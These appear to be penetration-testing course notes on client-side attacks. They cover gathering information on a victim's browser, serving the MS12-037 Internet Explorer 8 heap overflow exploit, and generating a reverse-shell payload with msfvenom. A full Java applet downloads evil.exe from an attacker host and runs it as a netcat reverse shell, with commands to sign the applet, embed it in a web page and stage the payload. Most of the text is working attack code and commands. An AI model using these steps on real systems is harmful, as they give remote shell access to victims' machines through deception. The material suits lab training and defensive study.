Client Side Attacks

Info: Exploiting a weakness in client software, such as a browser, in order to gain access to a machine. 

Information Gathering - Passive

Gather information on the client machine to find:

OS system, 
Browser Version
Availability of JavaScript
+ anything else. 


Information Gathering - Active:

Extract information directly from the clinet by:

Phone call 
Email (with expectation of a response or a link click that would lead the victim's browser to a page that enumerates the user's browser version and installed extensions)


Scenario

MS12037 - Internet Explorer 8 Fixed Col Span ID

Info: Heap Overflow caused by incorrect handling of the span Attribute, for col elements, from a fixed table. 
Target: Windows 7 (x86) - IE 8.0.7601.17514


Attacker Set up Apache Server and download the exploit

root@kali:~# cd /var/www/html/
root@kali: # wget -O exploit.html http://www.exploit-db.com/download/24017 r
oot@kali: # service apache2 start


Victim Browse to attackers file in IE 8. 


Swap Shellcode and format to unicode output. 

Info: Previous shellcode was converted to unicode to accomodate Internet Explorer, JavaScript strings in unicode. 

root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=443 -f js_le -e generic/none

Note: Make sure payload is the same size (add NOPs)


Scenario 2

Java Signed Applet Attack


Info: Affects targets with Java installed and enabled in their browsers (This is a required feature for many administrators and power users)

Note: A warning box will pop up on client side before executing the java code. The code will only be executed if the user clicks 'Run' on this warning. 

Code: 

import java.applet.*;
import java.awt.*;
import java.io.*;
import java.net.URL;
import java.util.*;
/**
* Author: Offensive Security
* This Java applet will download a file and execute it.
**/

public class Java extends Applet {

private Object initialized = null;
public Object isInitialized()
{
return initialized;
}
public void init() {
        Process f;
        try {
String tmpdir = System.getProperty("java.io.tmpdir") + File.separator;
String expath = tmpdir + "evil.exe";
String download = "";
download = getParameter("1");
if (download.length() > 0) {
// URL parameter
URL url = new URL(download);
// Get an input stream for reading
InputStream in = url.openStream();
// Create a buffered input stream for efficency
BufferedInputStream bufIn = new BufferedInputStream(in);
File outputFile = new File(expath);
OutputStream out = new BufferedOutputStream(new FileOutputStream(outputFile));
byte[] buffer = new byte[2048];
for (;;) {
int nBytes = bufIn.read(buffer);
if (nBytes <= 0) break;
out.write(buffer, 0, nBytes);
}
out.flush();
out.close();
in.close();
f = Runtime.getRuntime().exec("cmd.exe /c " + expath + " 10.11.0.117 4555 -e cmd.exe");
}

} catch(IOException e) {
e.printStackTrace();
}
/* ended here and commented out below for bypass */
catch (Exception exception)
{
exception.printStackTrace();
}
}
}


Compile and sign Applet

root@kali:~# javac Java.java
root@kali:~# echo “Permissions: all-permissions” > /root/manifest.txt 
root@kali:~# jar cvf Java.jar Java.class
root@kali:~# keytool -genkey -alias signapplet -keystore mykeystore -keypass mykeypass -storepass password123
--------------------------------------------
What is your first and last name? [Unknown]: Offensive Security
What is the name of your organizational unit? [Unknown]: Ownage Dept
What is the name of your organization? [Unknown]: Offensive Security
What is the name of your City or Locality? [Unknown]: localhost
What is the name of your State or Province? [Unknown]: 127.0.0.1
What is the two-letter country code for this unit? [Unknown]: US
Is CN=Offensive Security, OU=Ownage Dept, O=Offensive Security, L=localhost, ST=127.0.0.1, C=US correct?
[no]: yes
---------------------------------------------------------------------
root@kali:~# jarsigner -keystore mykeystore -storepass password123 -keypass mykeypass -signedjar SignedJava.jar Java.jar signapplet
root@kali:~ # cp Java.class SignedJava.jar /var/www/html/


Embed Applet in HTML File and write to web root folder

root@kali:~# echo '<applet width="1" height="1" id="Java Secure" code="Java.class" archive="SignedJava.jar"><param name="1" value="http://10.11.0.5:80/evil.exe"></applet>' > /var/www/html/java.html
O

Copy nc.exe to web root and rename it to evil.exe

root@kali:~# cp /usr/share/windows-binaries/nc.exe /var/www/html/evil.exe



Explanation:

When the victim loads java.html, the signed java applet warning will appear. If the user clicks run, the applet will load the evil.exe file and on running this file will execute a reverse shell to 10.11.0.117 4555.



